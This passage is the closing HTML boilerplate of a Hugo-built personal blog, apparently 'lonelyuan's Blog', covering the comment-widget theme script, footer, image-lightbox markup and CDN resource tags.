    data-lang="zh-CN"
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark_dimmed');
            }
        }
    })();
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2023 lonelyuan&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.20.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
